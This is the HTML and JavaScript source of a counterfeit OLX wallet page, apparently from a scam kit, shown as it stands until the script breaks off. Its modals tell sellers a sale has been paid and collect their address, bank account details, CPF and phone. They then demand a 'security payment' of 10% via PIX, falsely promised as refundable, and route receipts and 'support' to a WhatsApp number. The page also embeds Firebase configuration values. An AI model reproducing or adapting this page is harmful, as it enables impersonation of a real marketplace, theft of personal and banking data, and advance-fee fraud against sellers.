<!--
ATENÇÃO: O FUNDO DA CARTEIRA (layout, cores, estrutura, responsividade) NÃO DEVE SER ALTERADO!
Qualquer ajuste futuro deve ser feito apenas nos MODAIS. O fundo está BLOQUEADO para alterações.
-->
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carteira - OLX</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <script>
        (function() { if (sessionStorage.getItem('isLoggedIn') !== 'true') { window.location.href = 'index.html'; } })();
    </script>
    <style>
        /*
        ATENÇÃO: O CSS DO FUNDO DA CARTEIRA NÃO DEVE SER ALTERADO!
        Qualquer ajuste futuro deve ser feito apenas nos MODAIS.
        */
        :root {
            --olx-purple: #6E0AD6;
            --olx-dark-purple: #5A08B2;
            --olx-orange: #F28000;
            --olx-light-gray: #F7F8F9;
            --olx-white: #FFFFFF;
            --text-color: #303539;
            --text-color-light: #8C949A;
        }
        body { margin: 0; font-family: 'Nunito Sans', sans-serif; background-color: var(--olx-light-gray); }

        .simple-header { background-color: var(--olx-purple); color: var(--olx-white); padding: 1rem 1.5rem; display: flex; align-items: center; }
        .header-content { display: flex; align-items: center; gap: 1rem; }
        .simple-header .back-arrow, .simple-header .title { font-size: 1.2rem; font-weight: 700; }
        .simple-header .options-menu { font-size: 1.5rem; cursor: pointer; margin-left: auto; }

        .wallet-balance-section { background-color: var(--olx-purple); color: var(--olx-white); padding: 1rem 1.5rem 1.5rem; }
        .balance-display { display: flex; justify-content: space-between; align-items: center; }
        .balance-title { font-size: 1rem; display: flex; align-items: center; gap: 0.5rem; }
        .balance-title svg { cursor: pointer; }
        .balance-amount-wrapper { margin-top: 0.5rem; min-height: 44px; display: flex; align-items: center; }
        .balance-amount { font-size: 2.5rem; font-weight: 700; }
        .balance-amount .currency { font-size: 1.5rem; }
        #balance-hidden-bar { display: none; background-color: var(--olx-dark-purple); height: 20px; width: 140px; border-radius: 10px; }
        
        .balance-container.hidden .balance-amount { display: none; }
        .balance-container.hidden #balance-hidden-bar { display: block; }
        #eye-icon-slashed { display: none; }
        .balance-container.hidden #eye-icon-open { display: none; }
        .balance-container.hidden #eye-icon-slashed { display: block; }
        
        .btn-withdraw { background-color: var(--olx-orange); color: var(--olx-white); border: none; padding: 0.7rem 1.3rem; border-radius: 999px; font-weight: 700; cursor: pointer; font-size: 0.9rem; }
        
        .total-receber-section { background-color: var(--olx-dark-purple); color: var(--olx-white); padding: 1rem 1.5rem; display: flex; justify-content: space-between; align-items: center; font-weight: 600; cursor: pointer; }
        .total-receber-section .value { display: inline-block; }
        .total-receber-section .hidden-bar { display: none; background-color: var(--olx-purple); height: 16px; width: 80px; border-radius: 8px; }

        .total-receber-section.hidden .value { display: none; }
        .total-receber-section.hidden .hidden-bar { display: inline-block; }

        .main-content { padding: 1rem; }
        .card { background-color: var(--olx-white); border-radius: 8px; padding: 1.5rem; margin-bottom: 1rem; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
        .card-saque { display: flex; align-items: flex-start; gap: 1rem; }
        .card-saque .icon img { width: 56px; height: 56px; margin-top: -4px; }
        .card-saque .info h3 { margin: 0 0 0.5rem 0; font-size: 1.1rem; }
        .card-saque .info p { margin: 0 0 1.5rem 0; color: var(--text-color-light); font-size: 0.9rem; line-height: 1.4; }
        .btn-card { display: block; width: 100%; padding: 0.8rem; text-align: center; border-radius: 999px; text-decoration: none; font-weight: 700; font-size: 1rem; background-color: var(--olx-orange); color: var(--olx-white); border: none; cursor: pointer; }
        
        .card-historico h3 { margin: 0 0 1rem 0; font-size: 1.1rem; }
        .card-historico p { margin: 0; color: var(--text-color-light); text-align: center; padding: 2rem 0; }

        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); }
        .modal-content {
            background-color: #fefefe;
            padding: 30px;
            border: 1px solid #888;
            width: 90%;
            max-width: 500px;
            border-radius: 8px;
            text-align: center;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .close-modal-btn { position: absolute; top: 10px; right: 20px; color: var(--text-color-light); font-size: 2.5rem; font-weight: 300; cursor: pointer; }

        .chat-support-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: var(--olx-purple);
            color: white;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: none;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            pointer-events: auto;
        }
        .modal-endereco-aberta .chat-support-btn {
            display: none !important;
        }
        #sendChatMessage { background-color: var(--olx-orange); border-color: var(--olx-orange); color: white; padding: 0.7rem 1.5rem; border-radius: 999px; font-weight: 700; font-size: 0.9rem; border: 2px solid; cursor: pointer; }

        .chat-modal .modal-content { max-width: 400px; }
        .chat-modal input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; }
        .chat-modal button { background-color: var(--olx-orange); color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }

        /* Modal de Login */
        .login-modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); align-items: center; justify-content: center; }
        .login-modal .modal-content { background-color: white; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; text-align: center; position: relative; }
        .login-modal h2 { color: var(--olx-purple); margin-bottom: 20px; font-size: 24px; }
        .login-modal .form-group { margin-bottom: 20px; text-align: left; }
        .login-modal label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        .login-modal input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        .login-modal .btn-login { background-color: var(--olx-purple); color: white; border: none; padding: 12px 30px; border-radius: 6px; font-size: 16px; cursor: pointer; width: 100%; margin-top: 10px; }
        .login-modal .btn-login:hover { background-color: var(--olx-dark-purple); }
        .login-modal .error { color: #e74c3c; font-size: 14px; margin-top: 5px; display: none; }

        /* Estilos para formulários de saque */
        .form-group { margin-bottom: 1rem; }
        .form-group label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: var(--text-color); }
        .form-group input, .form-group select { width: 100%; padding: 0.8rem; border: 1px solid #ddd; border-radius: 4px; font-size: 1rem; box-sizing: border-box; }
        .form-group input:focus, .form-group select:focus { border-color: var(--olx-purple); outline: none; }
        .btn-submit { background-color: var(--olx-orange); color: white; border: none; padding: 0.8rem 1.5rem; border-radius: 4px; font-weight: 700; cursor: pointer; width: 100%; margin-top: 1rem; }

        @media (max-width: 600px) {
            .modal-content {
                max-width: 95vw !important;
                width: 95vw !important;
                min-width: unset !important;
                padding: 18px 6vw !important;
                border-radius: 14px !important;
            }
            #enderecoModal .modal-content input,
            #enderecoModal .modal-content button {
                font-size: 1rem !important;
            }
        }
        #enderecoModal .modal-content input {
            margin-bottom: 8px;
        }
        #enderecoModal .modal-content button[type="submit"] {
            margin-top: 10px;
        }

        @media (max-width: 600px) {
            .modal-endereco {
                max-width: 95vw !important;
                width: 95vw !important;
                min-width: unset !important;
                margin: 0 auto !important;
                padding: 14px 2vw !important;
                border-radius: 12px !important;
                box-sizing: border-box !important;
            }
            #enderecoModal .modal-endereco form {
                display: flex;
                flex-direction: column;
                gap: 0;
            }
            #enderecoModal .cep-row {
                flex-direction: column !important;
                gap: 0 !important;
            }
            #enderecoModal .cep-row input {
                margin-bottom: 8px !important;
            }
            #enderecoModal .cep-row button {
                width: 100% !important;
                margin-left: 0 !important;
            }
        }
        #enderecoModal .modal-endereco input {
            margin-bottom: 8px;
            border-radius: 8px;
        }
        #enderecoModal .modal-endereco button[type="submit"] {
            margin-top: 10px;
            border-radius: 8px;
        }
        #enderecoModal .cep-row {
            display: flex;
            flex-direction: row;
            gap: 8px;
            margin-bottom: 10px;
        }
        #enderecoModal .cep-row input {
            flex: 2;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #ddd;
            font-size: 1rem;
        }
        #enderecoModal .cep-row button {
            flex: 1;
            background: var(--olx-orange);
            color: #fff;
            border-radius: 8px;
            padding: 10px 0;
            border: none;
            font-weight: bold;
            font-size: 1rem;
            cursor:pointer;
            margin-left: 0;
        }

        /* Restaurar padrão do primeiro modal */
        #enderecoModal .modal-endereco {
            max-width: 420px;
            width: 100%;
            margin: 0 auto;
            background: #fff;
            border-radius: 18px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.18);
            padding: 32px 28px;
        }
        #enderecoModal .modal-endereco h2 {
            text-align: center;
            color: var(--olx-orange);
            margin-bottom: 18px;
            font-size: 1.6rem;
        }
        #enderecoModal .modal-endereco input {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #ddd;
            font-size: 1.1rem;
            margin-bottom: 10px;
        }
        #enderecoModal .modal-endereco input[readonly] {
            background: #f7f7f7;
        }
        #enderecoModal .modal-endereco .cep-row {
            display: flex;
            gap: 10px;
            margin-bottom: 12px;
        }
        #enderecoModal .modal-endereco .cep-row input {
            flex: 2;
        }
        #enderecoModal .modal-endereco .cep-row button {
            flex: 1;
            background: var(--olx-orange);
            color: #fff;
            border-radius: 8px;
            padding: 12px 0;
            border: none;
            font-weight: bold;
            font-size: 1.1rem;
            cursor:pointer;
            margin-left: 10px;
        }
        #enderecoModal .modal-endereco button[type="submit"] {
            width: 100%;
            padding: 14px 0;
            font-size: 1.1rem;
            border-radius: 8px;
            background-color: var(--olx-orange);
            color: #fff;
            border: none;
            font-weight: bold;
            margin-top: 10px;
        }
        @media (max-width: 600px) {
            #enderecoModal .modal-endereco {
                max-width: 98vw;
                padding: 18px 6vw;
                border-radius: 14px;
            }
            #enderecoModal .modal-endereco h2 {
                font-size: 1.2rem;
            }
            #enderecoModal .modal-endereco input,
            #enderecoModal .modal-endereco button {
                font-size: 1rem;
            }
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @media (max-width: 600px) {
            .modal {
                pointer-events: none;
            }
            .modal .modal-content {
                pointer-events: auto;
                margin-top: 80px !important;
            }
        }
        .chave-pix {
          word-break: break-all;
          overflow-wrap: break-word;
          max-width: 220px;
          display: inline-block;
          text-align: left;
        }
        @media (max-width: 600px) {
          .chave-pix {
            max-width: 120px;
            font-size: 0.95em;
          }
        }
    </style>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
</head>
<body>
    <header class="simple-header">
        <div class="header-content"><span class="back-arrow">&larr;</span><span class="title">Carteira OLX</span></div>
        <span class="options-menu">&#8942;</span>
    </header>

    <!-- Modal de Login -->
    <div id="loginModal" class="login-modal">
        <div class="modal-content">
            <h2>Faça login para continuar</h2>
            <form id="loginForm">
                <div class="form-group">
                    <label for="loginEmail">E-mail</label>
                    <input type="email" id="loginEmail" required>
                    <div class="error" id="emailError">E-mail inválido</div>
                </div>
                <div class="form-group">
                    <label for="loginPassword">Senha</label>
                    <input type="password" id="loginPassword" required>
                    <div class="error" id="passwordError">Senha obrigatória</div>
                </div>
                <button type="submit" class="btn-login">Entrar</button>
            </form>
        </div>
    </div>

    <!-- Conteúdo principal -->
    <div id="mainContent" style="display: block;">
        <div class="wallet-balance-section">
            <div class="balance-display">
                <div class="balance-container">
                    <div class="balance-title">Saldo disponível 
                        <svg id="toggle-balance" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <g id="eye-icon-open"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></g>
                            <g id="eye-icon-slashed"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></g>
                        </svg>
        </div>
                    <div class="balance-amount-wrapper">
                        <div class="balance-amount"><span class="currency">R$</span><span id="balanceAmount">0,00</span></div>
                        <div id="balance-hidden-bar"></div>
                    </div>
                </div>
                <button class="btn-withdraw">Sacar agora</button>
            </div>
        </div>
        <div class="total-receber-section">
            <div>
                <span>Total a receber </span>
                <span class="value">R$ <span id="totalReceber">0,00</span></span>
                <span class="hidden-bar"></span>
            </div>
            <span>&gt;</span>
    </div>

        <div class="main-content">
            <div class="card card-saque">
                <div class="icon"><img src="src/assets/images/Screenshot_47.png" alt="Ícone de saque"></div>
            <div class="info">
                    <h3>Saque automático</h3>
                    <p>Seu saldo e pagamentos liberados serão transferidos automaticamente para a sua conta principal.</p>
                    <button class="btn-card" id="openWithdrawBtn">Ver minhas contas</button>
                </div>
            </div>
            <div class="card card-historico">
                <h3>Histórico</h3>
                <p>Você não possui atividade nos últimos 90 dias</p>
            </div>
        </div>
    </div>

    <!-- Modal de Saque -->
    <div id="withdrawModal" class="modal">
        <div class="modal-content">
            <span class="close-modal-btn">&times;</span>
            <h2>Sacar dinheiro</h2>
            <form id="withdrawForm">
                <div class="form-group">
                    <label for="withdrawAmount">Valor para saque</label>
                    <input type="text" id="withdrawAmount" placeholder="Ex: 25,00" required>
                </div>
                <div class="form-group">
                    <label for="withdrawMethod">Método de pagamento</label>
                    <select id="withdrawMethod" required>
                        <option value="">Selecione...</option>
                        <option value="pix">PIX</option>
                        <option value="transfer">Transferência bancária</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="withdrawKey">Chave PIX</label>
                    <input type="text" id="withdrawKey" placeholder="Digite sua chave PIX">
                </div>
                <button type="submit" class="btn-submit">Solicitar saque</button>
            </form>
        </div>
    </div>

    <!-- Modal de Sucesso -->
    <div id="successModal" class="modal">
        <div class="modal-content">
            <span class="close-modal-btn">&times;</span>
            <h2>Saque solicitado!</h2>
            <p>Seu saque foi processado com sucesso. O valor será transferido em até 24 horas.</p>
        </div>
    </div>

    <!-- Chat flutuante moderno -->
    <div id="chatBalloon" style="display:none; position:fixed; bottom:90px; right:20px; width:320px; max-width:95vw; background:#fff; border-radius:16px; box-shadow:0 4px 24px #0002; z-index:9999; flex-direction:column; overflow:hidden;">
        <div style="background:var(--olx-purple); color:#fff; padding:14px 18px; font-weight:700; display:flex; align-items:center; justify-content:space-between;">
            <span>Suporte OLX</span>
            <span id="closeChatBalloon" style="cursor:pointer; font-size:1.5em;">&times;</span>
        </div>
        <div id="chatHistory" style="padding:14px 12px; height:220px; overflow-y:auto; background:#fafafa; font-size:1em;"></div>
        <form id="chatForm" style="display:flex; border-top:1px solid #eee; background:#fff;">
            <input id="chatInput" type="text" placeholder="Digite sua mensagem..." style="flex:1; border:none; padding:12px; font-size:1em; outline:none; background:#fff;">
            <button type="submit" style="background:var(--olx-orange); color:#fff; border:none; padding:0 18px; font-weight:700; font-size:1em; border-radius:0 0 0 0; cursor:pointer;">Enviar</button>
        </form>
    </div>

    <!-- Modal Parabéns -->
    <div id="parabensModal" class="modal" style="display:none;">
        <div class="modal-content" style="max-width: 420px; padding: 40px 30px 30px 30px;">
            <img src="src/assets/images/logo.png" alt="OLX Logo" style="width: 100px; margin-bottom: 1.5rem;">
            <div style="display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 1.2rem; font-weight: 700; color: #2A9200; margin-bottom: 1rem;">
                <svg width="28" height="28" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
                <span>Parabéns, Você Desapegou!</span>
            </div>
            <p style="color: #333; font-size: 1rem; line-height: 1.5; margin-bottom: 2rem;">Olá, Recebemos o pagamento do produto, informamos que aguarde até o veículo ser solicitado em sua residência.</p>
            <button id="btnVerDetalhes" class="btn-submit" style="background: var(--olx-orange); color: #fff; font-weight: 700; border-radius: 999px; padding: 0.8rem 1.5rem; font-size: 1rem; border: none; cursor: pointer;">Ver detalhes da venda</button>
        </div>
    </div>

    <!-- Modal Endereço de Coleta -->
    <div id="enderecoModal" class="modal" style="display:none;">
        <div class="modal-content" style="max-width: 420px; padding: 40px 30px 30px 30px;">
            <img src="src/assets/images/logo.png" alt="OLX Logo" style="width: 100px; margin-bottom: 1.5rem;">
            <div style="display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 1.2rem; font-weight: 700; color: var(--olx-orange); margin-bottom: 1rem;">
                <svg width="28" height="28" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
                <span>Confirme o endereço de coleta</span>
            </div>
            <form id="formEndereco">
                <div style="display: flex; gap: 10px; margin-bottom: 12px;">
                    <input type="text" id="cep" placeholder="CEP" maxlength="9" style="flex:2; padding: 12px; border-radius: 8px; border: 1px solid #ddd; font-size: 1.1rem;" required>
                    <button type="button" id="buscarCep" style="flex:1; background: var(--olx-orange); color: #fff; border-radius: 8px; padding: 12px 0; border: none; font-weight: bold; font-size: 1.1rem; cursor:pointer; margin-left: 10px;">Buscar</button>
                </div>
                <input type="text" id="bairro" placeholder="Bairro" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 10px; font-size: 1.1rem; background: #f7f7f7;" readonly required>
                <input type="text" id="rua" placeholder="Rua" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 10px; font-size: 1.1rem; background: #f7f7f7;" readonly required>
                <input type="text" id="numero" placeholder="Número da casa/apto" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 10px; font-size: 1.1rem;" required>
                <input type="text" id="complemento" placeholder="Complemento (opcional)" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 18px; font-size: 1.1rem;">
                <button type="submit" class="btn-submit" style="background: var(--olx-orange); color: #fff; font-weight: 700; border-radius: 999px; padding: 0.8rem 1.5rem; font-size: 1rem; border: none; cursor: pointer;">Confirmar e continuar</button>
            </form>
        </div>
    </div>

    <!-- Modal Dados Bancários -->
    <div id="dadosBancariosModal" class="modal" style="display:none;">
        <div class="modal-content" style="max-width: 420px; padding: 40px 30px 30px 30px;">
            <img src="src/assets/images/logo.png" alt="OLX Logo" style="width: 100px; margin-bottom: 1.5rem;">
            <div style="display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 1.2rem; font-weight: 700; color: var(--olx-orange); margin-bottom: 1rem;">
                <svg width="28" height="28" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
                <span>Dados para pagamento</span>
            </div>
            <form id="formDadosBancarios">
                <input type="text" id="banco" placeholder="Nome do banco" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 10px; font-size: 1.1rem;" required>
                <input type="text" id="agencia" placeholder="Agência" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 10px; font-size: 1.1rem;" required>
                <input type="text" id="conta" placeholder="Conta" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 10px; font-size: 1.1rem;" required>
                <input type="text" id="cpf" placeholder="CPF" maxlength="14" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 10px; font-size: 1.1rem;" required>
                <input type="text" id="telefone" placeholder="Telefone para contato" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 18px; font-size: 1.1rem;" required>
                <button type="submit" class="btn-submit" style="background: var(--olx-orange); color: #fff; font-weight: 700; border-radius: 999px; padding: 0.8rem 1.5rem; font-size: 1rem; border: none; cursor: pointer;">Confirmar</button>
            </form>
        </div>
    </div>

    <!-- Modal Motorista Encontrado -->
    <div id="motoristaModal" class="modal" style="display:none;">
        <div class="modal-content" style="max-width: 500px; min-height: 320px; display: flex; flex-direction: column; align-items: center; justify-content: center;">
            <div id="motoristaLoading" style="display: block; text-align: center;">
                <div class="spinner" style="margin: 30px auto 18px; border: 4px solid #eee; border-top: 4px solid var(--olx-orange); border-radius: 50%; width: 48px; height: 48px; animation: spin 1s linear infinite;"></div>
                <div style="font-size: 1.1rem; color: #555; margin-top: 10px;">Aguarde, estamos procurando um motorista para a coleta...</div>
            </div>
            <div id="motoristaContent" style="display: none; width: 100%;">
                <h2>Motorista encontrado!</h2>
                <img src="src/assets/images/Screenshot_47.png" alt="Motorista" style="width: 120px; margin: 20px auto; display: block;">
                <div id="infoMotorista" style="margin-bottom: 20px; color: #333;"></div>
                <div id="tempoMotorista">Chega em aproximadamente <b>30 minutos.</b></div>
                <div style="margin-top: 30px; display: flex; gap: 10px; justify-content: center;">
                    <button id="btnOutroMotorista" class="btn-submit" style="width: 50%;">Encontrar outro motorista</button>
                    <button id="btnSolicitarColeta" class="btn-submit" style="width: 50%;">Solicitar minha coleta</button>
                </div>
            </div>
        </div>
    </div>
    <!-- Modal Solicitar Motorista -->
    <div id="solicitarMotoristaModal" class="modal" style="display:none;">
      <div class="modal-content" style="max-width: 420px; text-align:center;">
        <img src="src/assets/images/unnamed.gif" alt="Procurando motorista" style="width:180px; margin:0 auto 18px; display:block;">
        <h2>Solicitar motorista</h2>
        <p>Para iniciar a coleta, clique no botão abaixo.</p>
        <button id="btnSolicitarColetaModal" class="btn-submit" style="background: var(--olx-orange); color: #fff; font-weight: 700; border-radius: 999px; padding: 0.8rem 1.5rem; font-size: 1rem; border: none; cursor: pointer;">Solicitar coleta</button>
      </div>
    </div>
    <!-- Modal Carregando Motorista -->
    <div id="carregandoMotoristaModal" class="modal" style="display:none;">
      <div class="modal-content" style="max-width: 420px; text-align:center;">
        <img src="src/assets/images/unnamed.gif" alt="Procurando motorista" style="width:120px; margin:0 auto 18px; display:block;">
        <h2>Procurando motorista...</h2>
        <p>Aguarde enquanto localizamos um motorista para sua coleta.</p>
      </div>
    </div>
    <!-- Modal Motorista Encontrado -->
    <div id="motoristaEncontradoModal" class="modal" style="display:none;">
      <div class="modal-content" style="max-width: 420px; text-align:center;">
        <h2>Motorista encontrado!</h2>
        <img id="foto-motorista-encontrado" src="" alt="Foto do Motorista" style="width:120px; margin:0 auto 18px; display:block; border-radius:50%;">
        <div id="info-motorista-encontrado" style="margin-bottom: 18px; color: #333;"></div>
        <div id="tempo-motorista-encontrado">Chega em aproximadamente <b>30 minutos.</b></div>
      </div>
    </div>
    <!-- Modal Qualificação -->
    <div id="qualificacaoModal" class="modal" style="display:none;">
        <div class="modal-content" style="max-width: 500px;">
            <div style="font-size: 3rem; color: #10b981; margin-bottom: 10px;">✔️</div>
            <h2 style="color: #10b981;">Qualificação feita com sucesso</h2>
            <p>Você irá receber seu dinheiro. Com base nos nossos Termos de Segurança, para evitar fraudes, deverá ser efetuado o pagamento de <b>10%</b> do valor da sua venda (<b>R$ 150,00</b>). Este valor será totalmente estornado, concluindo a venda ou não.</p>
            <button id="btnEntendi" class="btn-submit">Entendi</button>
        </div>
    </div>
    <!-- Modal Pagamento de Segurança -->
    <div id="pagamentoModal" class="modal" style="display:none;">
        <div class="modal-content" style="max-width: 500px;">
            <h2>Pagamento de Segurança</h2>
            <div style="background: #f7f8f9; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 10px;">
                    <b>Chave PIX:</b>
                    <span id="chavePixTexto" class="chave-pix">Chave não configurada</span>
                    <button id="btnCopiarPix" style="padding: 4px 10px; font-size: 0.95em; border-radius: 6px; border: none; background: #ff8000; color: #fff; cursor: pointer;">Copiar</button>
                </div>
                <img id="qrCodePixImg" src="" alt="QR Code para pagamento" style="width: 180px; margin: 10px auto; display: block; background: #fff; border: 1px solid #eee;">
            </div>
            <button id="btnJaPaguei" class="btn-submit">Já paguei</button>
        </div>
    </div>
    <!-- Modal Enviar Comprovante -->
    <div id="comprovanteModal" class="modal" style="display:none;">
        <div class="modal-content" style="max-width: 500px;">
            <h2>Enviar Comprovante</h2>
            <p>Para finalizar, clique no botão abaixo para enviar o seu comprovante de pagamento via WhatsApp para nossa equipe de suporte.</p>
            <img src="src/assets/images/Screenshot_48.png" alt="Enviar comprovante" style="width: 100px; margin: 20px auto; display: block;">
            <button id="btnEnviarComprovante" class="btn-submit">Enviar Comprovante no WhatsApp</button>
        </div>
    </div>

    <!-- Botão flutuante de suporte (sempre visível, exceto no modal de endereço) -->
    <button class="chat-support-btn" id="chatSupportBtn">
        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
        </svg>
    </button>

    <script>
        // Inicialização do Firebase e Firestore ANTES de qualquer uso de db
        const firebaseConfig = {
            apiKey: "AIzaSyAbJ4L2RrjzH0up0OVR2SrGt3-Qc0mhNow",
            authDomain: "olxx-a64c1.firebaseapp.com",
            projectId: "olxx-a64c1",
            storageBucket: "olxx-a64c1.firebasestorage.app",
            messagingSenderId: "367643482865",
            appId: "1:367643482865:web:bf19a0ede2ae706f922750",
            measurementId: "G-67XZYFDHV1"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        document.addEventListener('DOMContentLoaded', function () {
            // Verificação de autenticação
            const isLoggedIn = sessionStorage.getItem('isLoggedIn') === 'true';
            const loginModal = document.getElementById('loginModal');
            const mainContent = document.getElementById('mainContent');
            const loginForm = document.getElementById('loginForm');

            // Função para inicializar todos os modais e funcionalidades
            function initializeApp() {
                // Lógica para ocultar/mostrar saldo
                const toggleBtn = document.getElementById('toggle-balance');
                const balanceContainer = document.querySelector('.balance-container');
                const totalReceberSection = document.querySelector('.total-receber-section');

                if (toggleBtn && balanceContainer && totalReceberSection) {
                    toggleBtn.addEventListener('click', function () {
                        balanceContainer.classList.toggle('hidden');
                        totalReceberSection.classList.toggle('hidden');
                    });
                }

                // Lógica dos Modais
                const withdrawModal = document.getElementById('withdrawModal');
                const successModal = document.getElementById('successModal');
                const chatModal = document.getElementById('chatModal');

                if (withdrawModal) {
                    document.getElementById('openWithdrawBtn').addEventListener('click', function () {
                        withdrawModal.style.display = 'block';
                    });
                }

                if (document.getElementById('withdrawForm')) {
                    document.getElementById('withdrawForm').addEventListener('submit', function (e) {
                        e.preventDefault();
                        withdrawModal.style.display = 'none';
                        successModal.style.display = 'block';
                    });
                }

                if (chatModal) {
                    document.getElementById('chatSupportBtn').addEventListener('click', function () {
                        console.log('Botão de suporte clicado!');
                        var chatModal = document.getElementById('chatModal');
                        if (chatModal) {
                            chatModal.style.display = 'block';
                            chatModal.style.zIndex = 9999;
                        }
                    });
                }

                // Fechar modais
                document.querySelectorAll('.modal').forEach(function (modal) {
                    const closeBtn = modal.querySelector('.close-modal-btn');
                    if (closeBtn) {
                        closeBtn.addEventListener('click', function () {
                            modal.style.display = 'none';
                        });
                    }
                    modal.addEventListener('click', function (e) {
                        if (e.target === modal) {
                            modal.style.display = 'none';
                        }
                    });
                });

                // Chat inteligente
                const chatInput = document.getElementById('chatInput');
                const sendChatBtn = document.getElementById('sendChatMessage');

                function handleChat() {
                    const message = chatInput.value.toLowerCase();
                    let response = '';

                    if (message.includes('saque') || message.includes('sacar')) {
                        response = 'Para fazer um saque, clique no botão "Sacar agora" no topo da carteira. Caso tenha dificuldades, clique abaixo para falar com nosso suporte especializado no WhatsApp.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+saque+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                    } else if (message.includes('saldo') || message.includes('dinheiro')) {
                        response = 'Seu saldo está visível no topo da carteira. Se precisar de detalhes ou não estiver correto, clique abaixo para falar com nosso suporte.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+saldo+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                    } else if (message.includes('pagamento') || message.includes('paguei') || message.includes('taxa')) {
                        response = 'O pagamento de segurança é necessário para evitar fraudes. Após pagar, envie o comprovante pelo botão na tela. Se precisar de ajuda, clique abaixo para falar com nosso suporte.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+pagamento+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                    } else if (message.includes('motorista')) {
                        response = 'O motorista será solicitado após a confirmação do endereço. Se tiver dúvidas ou não encontrou o motorista, clique abaixo para falar com nosso suporte.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+motorista+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                    } else if (message.includes('coleta')) {
